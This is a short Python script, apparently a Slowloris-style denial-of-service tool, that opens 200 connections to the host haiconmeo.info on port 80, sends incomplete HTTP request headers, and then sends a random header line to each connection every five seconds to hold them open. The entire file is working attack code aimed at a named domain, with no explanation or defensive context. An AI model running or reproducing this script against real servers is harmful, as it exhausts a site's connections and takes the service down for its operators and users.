import socket
import uuid
import time
import signal
def hander(signum, frame):
    for i in socks_list:
        i.send(b'\r\n\r\n')
    print('release all connnection')
    exit()
signal.signal(signal.SIGTERM, hander)
socks_list =[]
def init_sock():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('haiconmeo.info',80))
    s.sendall(b"GET / HTTP/1.1\r\nHost: haiconmeo.com\r\n")
    return s
def keep_connection():
    for i in socks_list:
        i.send(b"x-tsu:%s\r\n" % str(uuid.uuid4()).encode('utf-8'))
if __name__ == "__main__":
    for i in range(200):
        print(i)
        a = init_sock()
        socks_list.append(a)
    while True:
        try:
            keep_connection()
            time.sleep(5)
        except:
            pass

